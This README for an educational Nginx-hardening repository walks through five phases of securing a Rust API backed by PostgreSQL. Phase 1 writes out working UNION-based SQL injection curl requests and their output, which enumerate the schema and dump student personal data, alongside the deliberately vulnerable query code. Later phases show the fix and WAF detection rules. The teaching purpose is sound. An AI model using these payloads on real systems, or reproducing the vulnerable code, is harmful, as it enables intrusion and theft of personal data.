# Securing Nginx: A Step-by-Step Guide

This project demonstrates a progressive approach to securing a web application using Nginx as a reverse proxy. It uses a Rust API backend and PostgreSQL database. It's structured in five phases, each building upon the previous one to showcase different security measures and best practices.

Through five phases, we gradually secure this setup, addressing common vulnerabilities and implementing industry-standard security practices.

The purpose of this demo is to illustrate a hands-on approach to implementing basic security measures, including SQL injection prevention, SSL, mitigating excessive load, and setting up a WAF with Nginx.

The services demonstrated are:

- Nginx reverse proxy
- Rust web API implemented with actix
- PostgreSQL database 

A Docker Compose file in each of the subdirectories provides a running example of the stack in that phase.

## Disclaimer ⚠️

**This project is for educational purposes only.  Source code and configuration in this repository demonstrate intentionally insecure practices to highlight the importance of proper security measures.** 

The vulnerabilities shown in this project are dangerous and can lead to serious security breaches if used in a real-world application. By proceeding with this project, you acknowledge that you understand the risks associated with these vulnerable practices and agree to use this knowledge responsibly and ethically.

Always sanitize your inputs and use parameterized queries to prevent SQL injection vulnerabilities. Always encrypt traffic between services. Never trust user input. 

Security is an ongoing practice, not a one-time implementation. Stay informed and continuously improve your security posture. See the OWASP Top 10 awareness document as a first step. [https://owasp.org/www-project-top-ten/]

## Project Structure

The project is organized into five directories; after the first phase, each 
subsequent step represents a gradual improvement to overall web application security:

```
.
├── 01-vulnerable-setup
├── 02-parameterized-query
├── 03-adding-tls
├── 04-adding-waf
└── 05-rate-limiting-and-load-shedding
```

Each directory contains the following files and subdirectories:
- `api/`: Rust API source code
- `docker-compose.yml`: Docker Compose configuration for the phase
- `init.sql`: Initial database setup script
- `nginx/`: Nginx configuration files

## Running the stack at any given phase

1. In any given Phase directory, stop containers and start containers:
   ```
   docker-compose up --build
   ```

3. Access the application at `http://localhost` (or `https://localhost` for phases 3-5)

4. Once any given Phase is complete, stop the application:
   ```
   docker-compose down -v
   ```

## Phase 1: Trivially Vulnerable API 

**This phase sets up the basic application with a improperly-written, vulnerable API.** It includes:

- A Rust web API with a trivial SQL injection vulnerability
- A PostgreSQL database
- A basic Nginx reverse proxy configuration

This setup demonstrates common security flaws in web applications, including a SQL injection vulnerability, unencrypted communication due to the absence of TLS, and the lack of measures to mitigate heavy load.

To demonstrate, run the containers in this directory with

```sh
docker compose down -v && \
docker compose build && \
docker compose up
```

When the containers are ready, you can query the API on `localhost` using a browser or other client.

(`http://localhost/search?prefix=Intro`):

```json
[
    {
        "id": 1,
        "title": "Introduction to Philosophy",
        "description": "Explore fundamental questions about existence, knowledge, and ethics.",
        "instructor": "Dr. Anne Johnson"
    },
    {
        "id": 4,
        "title": "Introduction to Psychology",
        "description": "Learn the basics of human behavior, cognition, and emotion.",
        "instructor": "Dr. Rachel Green"
    }
]
```

However, the API currently exposes a SQL injection vulnerability.

A malicious actor can exploit the injection vulnerabilty. The attacker might begin by constructing a query to return metadata about the database, after exploring the output of the API and discovering that it is very poorly designed.  After some exploration, they graft a PostgreSQL `VERSION()` call using a union in order to conform to the inferred shape of the table the application is querying: 
(`http://localhost/search?prefix=Intro' UNION SELECT 1, VERSION(), NULL, NULL--`):

```sh
$ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%201,%20VERSION\(\),%20NULL,%20NULL-- | jq
[
  {
    "id": 1,
    "title": "PostgreSQL 13.16 on aarch64-unknown-linux-musl, compiled by gcc (Alpine 13.2.1_git20240309) 13.2.1 20240309, 64-bit",
    "description": null,
    "instructor": null
  }
]
```

Discovering that the database appears to be Postgres, the malicious actor can then write a query to list databases... 
(`http://localhost/search?prefix=Intro' UNION SELECT 1, datname, NULL, NULL FROM pg_database--`):

```sh
$ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%201,%20datname,%20NULL,%20NULL%20FROM%20pg_database-- | jq
[
  {
    "id": 1,
    "title": "template0",
    "description": null,
    "instructor": null
  },
  {
    "id": 1,
    "title": "postgres",
    "description": null,
    "instructor": null
  },
  {
    "id": 1,
    "title": "template1",
    "description": null,
    "instructor": null
  },
  {
    "id": 1,
    "title": "coursedb",
    "description": null,
    "instructor": null
  }
]
```

...tables...

(`http://localhost/search?prefix=Intro' UNION SELECT 1, table_name, NULL, NULL FROM information_schema.tables WHERE table_schema='public'--`):

```sh
$ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%201,%20table_name,%20NULL,%20NULL%20FROM%20information_schema.tables%20WHERE%20table_schema%20\=%20%27public%27-- | jq
[
  {
    "id": 1,
    "title": "students",
    "description": null,
    "instructor": null
  },
  {
    "id": 1,
    "title": "course_students",
    "description": null,
    "instructor": null
  },
  {
    "id": 1,
    "title": "courses",
    "description": null,
    "instructor": null
  }
]
```
...and columns within tables visible to the application user:

(`http://localhost/search?prefix=Intro' UNION SELECT 1, column_name, data_type, NULL FROM information_schema.columns WHERE table_name='students'--`):


```sh
$ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%201,%20column_name,%20data_type,%20NULL%20FROM%20information_schema.columns%20WHERE%20table_name%20\=%20%27students%27-- | jq
[
  {
    "id": 1,
    "title": "first_name",
    "description": "character varying",
    "instructor": null
  },
  {
    "id": 1,
    "title": "date_of_birth",
    "description": "date",
    "instructor": null
  },
  {
    "id": 1,
    "title": "email",
    "description": "character varying",
    "instructor": null
  },
  {
    "id": 1,
    "title": "last_name",
    "description": "character varying",
    "instructor": null
  },
  {
    "id": 1,
    "title": "id",
    "description": "integer",
    "instructor": null
  }
]
```

...and, ultimately, all student details:

(`http://localhost/search?prefix=Intro' UNION SELECT id, CONCAT(first_name, last_name), email, CAST(date_of_birth as VARCHAR) FROM students--`):

```sh
$ curl http://localhost/search\?prefix\=Intro%27%20UNION%20SELECT%20id,%20CONCAT\(first_name,%20%27%20%27,%20last_name\),%20email,%20CAST\(date_of_birth%20AS%20VARCHAR\)%20FROM%20students-- | jq
[
  {
    "id": 2,
    "title": "Liam Baker",
    "description": "liam.baker@example.com",
    "instructor": "2002-08-22"
  },
  {
    "id": 1,
    "title": "Sophia Adams",
    "description": "sophia.adams@example.com",
    "instructor": "2001-05-15"
  },
  {
    "id": 5,
    "title": "Emma Evans",
    "description": "emma.evans@example.com",
    "instructor": "2001-07-18"
  },
  ...
]
```

**Securing this API properly will require implementing security measures at multiple layers - in the next step, we'll focus on an immediate patch to the application layer.**

## Phase 2: Implementing parameterized SQL queries

This phase focuses on basic application-level security.  We'll address the immediate concern of the SQL injection vulnerability in the Rust API by parameterizing the query invoked by this API endpoint.

### The vulnerability

In Phase 1, the Rust code exposed a critical SQL injection vulnerability through unsafe string concatenation:

```rust
let sql = format!(
    "SELECT id, title, description, instructor FROM courses WHERE title LIKE '{}%'",
    query.prefix
);
let courses = sqlx::query_as::<_, Course>(&sql)
    .fetch_all(db_pool.get_ref())
    .await;
```

The user-supplied query.prefix is directly inserted into the SQL query string. There's no filtering or escaping of special characters in the user input. As demonstrated in Phase 1, an attacker could inject additional SQL commands, potentially leading to unauthorized data access or manipulation.

### The patch

In Phase 2, the code is improved by using parameterized queries via the `sqlx::query_as!` macro:

```rust
let courses = sqlx::query_as!(
    Course,
    "SELECT id, title, description, instructor FROM courses WHERE title LIKE $1",
    format!("{}%", query.prefix)
)
.fetch_all(db_pool.get_ref())
.await;
```

Now, the SQL query uses a parameter placholder `$1` instead of interpolating the user input directly into the string.  The macro ensures that user input is escaped and treated as data, rather than as part of the SQL command.  If malicious input is provided as an input, it will be treated as literal string data, preventing unintended SQL execution. 

By implementing this patch, the application significantly enhances its security posture against one of the most common and dangerous web application vulnerabilities.

## Phase 3: Adding TLS with Nginx 

This phase introduces HTTPS:
- Adds SSL/TLS encryption using self-signed certificates
- Configures Nginx to use HTTPS and redirect HTTP traffic to HTTPS

This phase demonstrates the importance of encrypted communications in web security.

If you run the Phase 1 or Phase 2 stack, you'll notice that all traffic is routed to the API through nginx over HTTP.  You'll notice that if you inspect network traffic on the loopback interface, it's completely unencrypted.  You can easily read information about the HTTP request and response events, including the entire contents of the payload.

On macOS, you can use a tool like `tcpdump` to demonstrate this:

```sh
$ sudo tcpdump -i lo0 -nvA 'tcp and port 80 and host 127.0.0.1'
```

visiting `http://localhost/search?prefix=Intro` in your browser, you'll see something like this written to your terminal by tcpdump (truncated for brevity):

```sh
tcpdump: listening on lo0, link-type NULL (BSD loopback), snapshot length 524288 bytes
22:49:15.304239 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 570, bad cksum 0 (->3abc)!)
    127.0.0.1.60065 > 127.0.0.1.80: Flags [P.], cksum 0x002f 

Host: localhost
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br, zstd


22:49:15.304318 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 52, bad cksum 0 (->3cc2)!)
proto TCP (6), length 526, bad cksum 0 (->3ae8)!)
    127.0.0.1.80 > 127.0.0.1.60065: Flags [P.], cksum 0x0003 (incorrect -> 0xd31a), seq 1:475, ack 518, win 6346, options [nop,nop,TS val 2002467784 ecr 1157802627], length 474: HTTP, length: 474
        HTTP/1.1 200 OK
        Server: nginx/1.27.1
        Date: Sun, 08 Sep 2024 03:49:15 GMT
        Content-Type: application/json
        Content-Length: 319
        Connection: keep-alive

        [{"id":1,"title":"Introduction to Philosophy","description":"Explore fundamental questions about existence, knowledge, and ethics.","instructor":"Dr. Anne Johnson"},{"id":4,"title":"Introduction to Psychology","description":"Learn the basics of human behavior, cognition, and emotion.","instructor":"Dr. Rachel Green"}] [|http]
w[;.E...HTTP/1.1 200 OK
... 
```

As you can see, traffic sent over HTTP is insecure.  To encrypt this data, we update our Ngnix server to use an SSL cert.  For demonstration purposes, we use a self-signed cert, generated locally using `openssl`:

```sh
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout nginx-selfsigned.key \
  -out nginx-selfsigned.crt \
  -subj "/C=US/ST=State/L=City/O=Organization/CN=localhost"
```

In our `nginx.conf` configuration, it's very simple to set up SSL using this key and cert.  First, we create a new server block to listen on port `443`, the default HTTPS port. We redirect traffic from `80` to `443`:

```nginx
  # nginx.conf 

  # ...

  # Redirect HTTP traffic to HTTPS
  server {
    listen 80;
    server_name localhost;
    return 301 https://$server_name$request_uri;
  }

  # HTTPS server config
  server {
    listen 443 ssl;
    server_name localhost;
  # ...

  }
```

In our new HTTPS server block, we use the `ssl_certificate` and `ssl_certificate_key` directives to point the server to the cert and key we generated.

```nginx
    # SSL certificate config
    ssl_certificate /etc/nginx/ssl/nginx-selfsigned.crt;
    ssl_certificate_key /etc/nginx/ssl/nginx-selfsigned.key;

    # SSL protocol and cipher config - only allow TLS 1.2 and 1.3
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256 # additional ciphers... 
```

Now, with containers in this and subsequent phases running, we can access API data using HTTPS, e.g. at `http://localhost/search?prefix=Intro`

In fact, we can use `tcpdump` again, modifying the command slightly to listen on port `443` instead of `80`. We'll also ignore checksum validation with `-K`, since we're working with the loopback interface (`lo0`) - these checks will typically fail when inspecting loopback traffic, as it's a special interface. There are lower-level reasons for this that aren't relevant to this demonstration; leaving the warnings in the output just add noise to what we're trying to observe.

```sh
$ sudo tcpdump -i lo0 -nvAK 'tcp and port 443 and host 127.0.0.1'
```

visiting `https://localhost/search?prefix=Intro` in your browser, you'll see something like this written to your terminal by tcpdump (truncated for brevity):


```sh
tcpdump: listening on lo0, link-type NULL (BSD loopback), snapshot length 524288 bytes
23:06:29.748692 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 592)
    127.0.0.1.60147 > 127.0.0.1.443: Flags [P.], seq 1385642167:1385642707, ack 117939963, win 6337, options [nop,nop,TS val 1445835693 ecr 384877254], length 540
E..P..@.@...............R.8..........E.....
V-............=.#.7.N.^....(. z..4...8.C.n8.1.Zy[.C.YS..j...?.I..
l/.#[._F.4...o../6....'..Y.bH.^m....t.u-.....mt.J=.%`......!a...$...`...<......Eh...x,8[r.S......) .}....."..zF.......(...      ...^W.-g....."....D.A\,.^....-A..*........
.).AUG...S.......P3..R..t.......|
.*d.#............... ....:...K.fp4..%.0#..s.?J1_...w..Kp....~(.V......o...ko..o..y...'/..D.].<>..4
o.otX........,de.V......v<...n......[P.E.-(...y?Xb...........9.mK\W....fo%................
 1.......m..ma$..`2u....+.-.y.u.8.._.....d\ks..jj.....6..?KFk.G.LJ.%.-..z...;..].......s..5F
23:06:29.748778 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 52)
    127.0.0.1.443 > 127.0.0.1.60147: Flags [.], ack 540, win 6343, options [nop,nop,TS val 384885596 ecr 1445835693], length 0
E..4..@.@...................R.:......(.....
...\V-..
23:06:29.752691 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 548)
    127.0.0.1.443 > 127.0.0.1.60147: Flags [P.], seq 1:497, ack 540, win 6343, options [nop,nop,TS val 384885600 ecr 1445835693], length 496
E..$..@.@...................R.:............
...`V-........Iz...5.B.zM.CV.Ij..c7l.5.?6.."...l...h.4....Ra....^u........^.==....9.@.......P.Wg.d...._G..a........QeJncl..CT..NTO...F......!f-14"6.......9.q...R....GY..#.k.hH.r..V..#_....g.CVt`.$..}.lg.{G...E..,S...j.b........>.......l-.N.}...?..\.i~u...5..mZ.5...8Wv.9+.2?.P.....`.._..+..](<.....|..`Vi,..r.`P..L(......cW ...W.!O.......V...y|.....s.....>D.........G...k.    ...>.|SGT.l2-.  F....8....dCkDxQ\...>....$.P.......Bv......^.......=....u.MSr..8.F..W..~vz+t.....K.\h[[....4..K.K.]..8`.;.?.Mb...g.f
23:06:29.752771 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 52)
    127.0.0.1.60147 > 127.0.0.1.443: Flags [.], ack 497, win 6329, options [nop,nop,TS val 1445835697 ecr 384885600], length 0
E..4..@.@...............R.:..........(.....
V-.....`
```

## Phase 4: Rate Limiting, Load Shedding

Building on the previous phase, this directory adds:
- Rate limiting to prevent abuse of the API
- Load shedding to maintain service availability under high load

These measures help protect against basic denial-of-service attacks 
and API abuse.

To demonstrate, run the containers in this directory with

```sh
docker compose down -v && \
docker compose build && \
docker compose up
```

You can test this by opening a browser to `http://localhost/search?prefix=Intro`.

Refresh the page and notice that it will hang when you make more than one request per second.

Make many consecutive requests by reloading rapidly, and notice that nginx will server a 503 Service Unavailable for a brief period of time.

To observe concurrent connection limits, you can use a tool like `ab`:

```sh
$ ab -n 20 -c 20 http://localhost/search\?prefix\=Intro
```

### How does this work?

We have updated `nginx.conf` to include new directives for rate limiting 
and connection limiting to help manage traffic and protect the server from 
potential abuse.

**`limit_req_zone` and `limit_conn_zone`**:

These directives define the zones for rate limiting and connection limiting:

```nginx
limit_req_zone $binary_remote_addr zone=one:10m rate=1r/s;
limit_conn_zone $binary_remote_addr zone=addr:10m;
```

`limit_req_zone`: Creates a shared memory zone named `one` of 10 megabytes to store 
request rates. It allows each client IP ($binary_remote_addr) to make up to 1 request 
per second (rate=1r/s).

`limit_conn_zone`: Creates a shared memory zone named `addr` of 10 megabytes to track the 
number of simultaneous connections for each client IP.

***`limit_req and limit_conn:`**

These directives apply the rate and connection limits defined above:

```nginx
limit_req zone=one burst=5;
limit_conn addr 10;
```

`limit_req`: Enforces the rate limit from the `one` zone, allowing a burst of up to 5 extra requests.
`limit_conn`: Limits each client IP to a maximum of 10 simultaneous connections in the `addr` zone.

## Phase 5: Adding a Web Application Firewall (WAF)

This phase incorporates ModSecurity, a powerful open-source Web Application Firewall (WAF), into our Nginx setup. A WAF adds an extra layer of security by inspecting incoming HTTP traffic and blocking potential attacks before they reach your application.

- Integrates ModSecurity with Nginx
- Configures basic ModSecurity rules to protect against common web attacks

### Key Components:

1. **ModSecurity Integration**: 
   - The Nginx Dockerfile has been updated to include ModSecurity compilation and installation. This process is a bit complex, as at the time of writing, it includes building the project from source.  For this demo, we're using a Debian Bullseye Slim base image.
    
   - The `load_module` directive in `nginx.conf` enables the ModSecurity module.

2. **Configuration Files**:
   - `main.conf`: Sets up basic ModSecurity configuration and includes other config files.
   - `modsecurity.conf`: Contains core ModSecurity settings and custom rules.
   - `ruleset.conf`: Includes the OWASP Core Rule Set (CRS).
   - `nginx.conf`: Updated to enable ModSecurity and set the rules file.

3. **OWASP Core Rule Set (CRS)**:
   - A set of generic attack detection rules that provide protection against many common attack categories.

### Key Features:

1. **SQL Injection Protection**: 
   ```
   SecRule ARGS "@detectSQLi" \
       "id:'200001',phase:2,block,log,msg:'SQL Injection Attempt Detected'"
   ```
   This rule uses ModSecurity's built-in SQL injection detection to block potential attacks.  This provides an outer layer of security against SQL injection attacks, ideally catching them _before_ the request is passed to the Rust API.

2. **Cross-Site Scripting (XSS) Protection**:
   ```
   SecRule ARGS "@detectXSS" \
       "id:'200002',phase:2,block,log,msg:'XSS Attempt Detected'"
   ```
   This rule employs ModSecurity's XSS detection capabilities to prevent XSS attacks.

3. **CSRF Protection**:
   ```
   SecRule REQUEST_METHOD "!@streq GET" "chain,id:'200006',phase:2,block,log,msg:'CSRF Attempt Detected'"
   SecRule &ARGS:csrf_token "@eq 0"
   ```
   This rule checks for the presence of a CSRF token in non-GET requests.

4. **File Upload Protection**:
   ```
   SecRule FILES_NAMES "@rx \.(php|phtml|php3|php4|php5|phps|exe|jsp|asp|aspx|cgi|pl|py|sh|dll)$" \
       "id:'200007',phase:2,block,log,msg:'Malicious File Upload Attempt Detected'"
   ```
   This rule blocks uploads of potentially dangerous file types.

5. **User-Agent Anomaly Detection**:
   ```
   SecRule REQUEST_HEADERS:User-Agent "^$" \
       "id:'200008',phase:2,block,log,msg:'Empty User-Agent Detected'"
   ```
   This rule flags requests with empty User-Agent headers, which could indicate automated attacks.

6. **Logging and Debugging**:
   - Extensive logging options are configured for debugging and auditing purposes.
   - JSON log format is used for easier parsing and analysis.

### Considerations:

WAFs always introduce some overhead.  It's important to monitor your application's performance after implementation.  

In realistic scenarios, WAFs will also sometimes block legitimate traffic - i.e. identify false positives.  This can be mitigated by carefully tuning rules, but there will likely always be edge cases.

Sophisticated attackers may try to bypass WAF rules. This is why WAFs should be part of a layered security approach.
